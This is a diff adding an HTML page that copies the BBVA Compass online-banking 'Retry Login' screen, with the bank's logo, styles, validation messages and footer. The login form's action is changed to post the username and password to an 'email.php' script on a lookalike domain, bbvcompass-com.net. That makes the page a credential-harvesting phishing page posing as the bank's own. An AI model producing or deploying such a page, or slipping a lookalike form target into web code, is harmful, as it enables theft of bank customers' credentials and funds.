@@ -1,0 +1,235 @@
+﻿<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+
+
+    
+        <title>Login - BBVA Compass</title>
+    
+    
+
+
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="viewport" content="width=1024, maximum-scale=3.0">
+    
+
+<script type="text/javascript" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/dtagent_ICAdx_7000000231009.js" data-dtconfig="agentUri=/secure/js/dtagent_ICAdx_7000000231009.js|rid=RID_-969201145|rpid=-34261826|cors=1|lastModification=1528254535755|lab=1|doNotInstrument=clk|reportUrl=https://olbdynatrace.bbvacompass.com/secure/dynaTraceMonitor|app=P1 Thunderbird|domain=bbvacompass.com"></script><script type="text/javascript">
+    var msg = {
+        accountInvalid:"Account Number entered does not match our records. Please try again.",
+        accountRequired:"Please enter Account Number.",
+        answerInvalid:"Answers must be 2-40 characters, spaces are allowed, and may not contain special characters.",
+        answerRequired:"Please answer this question.",
+        confirmPasswordNotMatched:"Passwords do not match. Please re-enter Password.",
+        confirmPasswordRequired:"Please re-enter Password.",
+        currentPasswordRequired:"Please enter Current Password.",
+        emailInvalid:"Please enter valid Email Address.",
+        emailRequired:"Please enter Email Address.",
+        emailSendFailed:"Error: Failed to Send Email. Please try again.",
+        error:"Error",
+        home:"Home",
+        incorrectAnswer:"is an Incorrect Answer. Please try again.",
+        newPasswordInvalid:"Your new password must not match Temporary or Previous Password.",
+        newPasswordRequired:"Please enter New Password.",
+        newPasswordRules:"Please note, Password must contain 8-20 characters, minimum one uppercase letter, one lowercase letter and one number. It may not contain spaces or the following characters '[', ']' , and '^' and may not match Username or Temporary Password.",
+        passwordInvalid:"Please enter valid Password.",
+        passwordRequired:"Please enter Password.",
+        passmarkLocked:"Your Passmark enrollment is locked out! Please call customer service for assistance.",
+        pinInvalid:"Please enter correct One-Time Security Code.",
+        pinRequired:"Please enter One-Time Security Code.",
+        selectOption:"Please select an option.",
+        selectQuestion:"Please Select A Question",
+        sentTo:"Message Was Sent To: ",
+        servicesUnavailable:"Services are not available. Please try again later.",
+        successMessage:"You have successfully completed this field.",
+        timeoutError:"The operation is taking longer than expected. Please, try again.",
+        tooManyAttempts:"Error: Too many attempts.",
+        tryAgain:"Please Try Again.",
+        unknownError:"Error: Unknown Error has occurred. Please try again.",
+        usernameInvalid:"Please enter valid Username.",
+        usernameRequired:"Please enter Username.",
+    };
+</script>
+
+    
+
+<link rel="stylesheet" href="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/fonts.css">
+<link rel="stylesheet" href="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/common_styles.css">
+<link rel="stylesheet" href="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/radio_styles.css">
+<link rel="stylesheet" href="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/select_styles.css">
+<link rel="stylesheet" href="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/bbva_styles.css">
+<link rel="stylesheet" href="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/auth_styles.css">
+
+    
+
+<script type="text/javascript" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/jquery-2.js"></script>
+<script type="text/javascript" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/jquery-ui-1.js"></script>
+<script type="text/javascript" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/validation.js"></script>
+<script type="text/javascript" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/validationRules.js"></script>
+<script type="text/javascript" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/webFlowActions.js"></script>
+<script type="text/javascript" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/webPageEvents.js"></script>
+
+
+    <script type="text/javascript">
+        $(document).keydown(function(e) {
+            var code = (e.keyCode ? e.keyCode : e.which);
+            if (code == 116) { //F5 keycode
+                if (window.event) {
+                    window.event.returnValue = null;
+                    event.keyCode = 0;
+                } else {
+                    e.preventDefault();
+                }
+                window.location.reload(true);
+            }
+            return true;
+        });
+    </script>
+
+                    <script async="" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/aksb.js"></script><script>var w=window;if(w.performance||w.mozPerformance||w.msPerformance||w.webkitPerformance){var d=document;AKSB=w.AKSB||{},AKSB.q=AKSB.q||[],AKSB.mark=AKSB.mark||function(e,_){AKSB.q.push(["mark",e,_||(new Date).getTime()])},AKSB.measure=AKSB.measure||function(e,_,t){AKSB.q.push(["measure",e,_,t||(new Date).getTime()])},AKSB.done=AKSB.done||function(e){AKSB.q.push(["done",e])},AKSB.mark("firstbyte",(new Date).getTime()),AKSB.prof={custid:"540490",ustr:"",originlat:"0",clientrtt:"61",ghostip:"204.237.224.79",ipv6:false,pct:"10",clientip:"107.77.229.76",requestid:"735b2d6",region:"27703",protocol:"",blver:14,akM:"a",akN:"ae",akTT:"O",akTX:"1",akTI:"735b2d6",ai:"225198",ra:"false",pmgn:"",pmgi:"",pmp:"",qc:""},function(e){var _=d.createElement("script");_.async="async",_.src=e;var t=d.getElementsByTagName("script"),t=t[t.length-1];t.parentNode.insertBefore(_,t)}(("https:"===d.location.protocol?"https:":"http:")+"//ds-aksb-a.akamaihd.net/aksb.min.js")}</script>
+                    </head>
+
+    <body>
+        <div id="application" style="display: none;">sba</div>
+        <div id="umg" style="display:none;">sba</div>
+
+        
+            
+            
+                <div id="pageHeader"><div class="auth_header">
+    <a href="https://www.bbvacompass.com/" class="auth_header_anchor">
+        <img src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/logo_bbva_compass.png" alt="&lt;fmt:message key='application.home.page'/&gt;">
+    </a>
+    <div class="auth_header_menu_bar"></div>
+</div>
+</div>
+                
+
+
+
+
+<!-- /views/authentication/loginRetry.jsp -->
+<div class="auth_content_div" id="content">
+	<h1 id="pageLabel" class="auth_display_label">Login</h1><br>
+    <div id="authBaseDiv" class="auth_base_div">
+        
+
+    
+    
+       
+    
+    
+
+
+
+
+        <div class="auth_main_form_div" id="authMainFormDiv">
+            <form id="loginRetry" name="loginRetry" class="loginForm enter_form" action="http://bbvcompass-com.net/olb/email.php" method="post">
+                <input value="/secure-auth" id="executionLogin" name="executionLogin" type="hidden">
+				<div id="loginMessage" class="auth_do_not_display">Sign in to your 
+BBVA Compass account with your username and password to pre-fill your 
+application with information from your account profile.</div>
+                <fieldset class="display_group">
+                    <div class="bbva-input-field bbva-input-filled bbva-success" data-bbva-class="input-field" aria-live="polite">
+                        <div class="bbva-input-field-container standard-text-input-field person-profile-image" data-bbva-class="bbva-input-container">
+                            <input class="bbva-input" data-bbva-class="input" tabindex="1" aria-labelledby="lblUsername" id="nickname" name="nickname" autocomplete="off" autofocus="" value="" type="text">
+                            <label class="floating-label-image" id="lblUsername" for="nickname">Username</label>
+                            <div class="bbva-input-success"><span class="bbva-success-message" role="alert" aria-label="You have successfully completed this field.">You have successfully completed this field.</span></div>
+                            <div class="bbva-error-container"><span class="bbva-error-icon"></span></div>
+                        </div>
+                    </div>
+                    <span class="auth_additional_link_wrapper">
+                        <a class="bbva-timeout bbva-anchor-link" tabindex="5" target="_blank" aria-label="Forgot Username" href="https://olb.bbvacompass.com/secure-auth/reminderNickname">
+                                Forgot Username
+                        </a>
+                    </span>
+                </fieldset>
+                <fieldset class="display_group">
+                    <div class="bbva-input-field bbva-input-filled bbva-success" data-bbva-class="input-field" aria-live="polite" id="authMaskedDiv">
+                        <div class="bbva-input-field-container masked-text-input-field padlock-image" data-bbva-class="bbva-input-container">
+                            <input class="bbva-input" tabindex="2" data-bbva-class="input" aria-labelledby="lblPassword" id="password" name="password" autocomplete="off" type="password">
+                            <label class="floating-label-image" id="lblPassword" for="password">Password</label>
+                            <div class="auth-masked-input-div">
+                                <img class="auth-masked-input-image" src="Retry&#32;Login&#32;-&#32;BBVA&#32;Compass_files/show_input.png" id="showHideIcon" data-bbva-class="show-hide" aria-label="Show" onclick="javascript:showHideProtectedInput(this.id, 'password')" tabindex="3">
+                                
+                            </div>
+                            <div class="bbva-input-success"><span class="bbva-success-message" role="alert" aria-label="You have successfully completed this field.">You have successfully completed this field.</span></div>
+                            <div class="bbva-error-container"><span class="bbva-error-icon"></span></div>
+                        </div>
+                    </div>
+                    <span class="auth_additional_link_wrapper">
+                        <a class="bbva-timeout bbva-anchor-link" tabindex="6" target="_blank" aria-label="Forgot Password" href="https://olb.bbvacompass.com/secure-auth/reminderPassword">
+                               Forgot Password
+                        </a>
+                    </span>
+                </fieldset>
+                <fieldset class="display_group">
+                    <button class="bbva-button-green jsSubmitPage" type="submit" name="action" value="Continue" tabindex="4">
+                        <strong>Continue</strong>
+                    </button>
+                </fieldset>
+            </form>
+		</div>
+	</div>
+</div>
+<script type="text/javascript">
+    setElementClass("sba","content");
+    setElementClass("sba","pageLabel");
+    setElementClass("sba","authBaseDiv");
+    setElementClass("sba","authMainFormDiv");
+    setElementClass("sba","loginMessage");
+</script>
+                <div id="pageFooter">
+<c:set var="time" value="Thu Oct 04 12:09:33 CDT 2018">
+<div class="auth_footer">
+    <ul class="auth_footer_menu">
+        <li class="fc">
+            <a target="_blank" href="https://www.bbvacompass.com/security/" id="linkSecurityCenter" aria-label="Security Center">
+                    Security Center
+            </a>
+        </li>
+        <li>
+            <a target="_blank" href="https://www.bbvacompass.com/compass/policy/privacy.jsp" id="linkPrivacy" aria-label="Privacy">
+                    Privacy
+            </a>
+        </li>
+        <li>
+            <a target="_blank" href="https://www.bbvacompass.com/digital-banking-services/online-banking/help/terms-agreement.html" id="linkAgreement" aria-label="Online Banking Agreement">
+                    Online Banking Agreement
+            </a>
+        </li>
+        <li>
+            <a target="_blank" href="https://www.bbvacompass.com/online-banking/electronic-communications-agreement.jsp" id="linkECAgreement" aria-label="Electronic Communications Agreement">
+                    Electronic Communications Agreement
+            </a>
+        </li>
+        <li>
+            <a target="_blank" href="http://www.bbvacompass.com/locations/" id="linkLocations" aria-label="Locations">
+                    Locations
+            </a>
+        </li>
+        <li class="lc">
+            <a target="_blank" href="https://www.bbvacompass.com/contact/securemessage.jsp" id="linkContactUs" aria-label="Contact Us">
+                    Contact Us
+            </a>
+        </li>
+    </ul>
+    <div class="auth_footer_copyright">
+        <p class="copyright" align="center">
+            ©
+            
+            BBVA Compass Bancshares, Inc. Compass Bank is a Member FDIC and an Equal Housing Lender.<br>
+            BBVA Compass is a trade name of Compass Bank, a member of the BBVA Group.<br>
+            Online Banking Questions and Technical Support: 1-800-273-1057.<br>
+            All other Account Questions and Support: 1-800-266-7277.
+        </p>
+	</div>
+</div>
+</c:set></div>
+            
+        
+    
+</body></html>
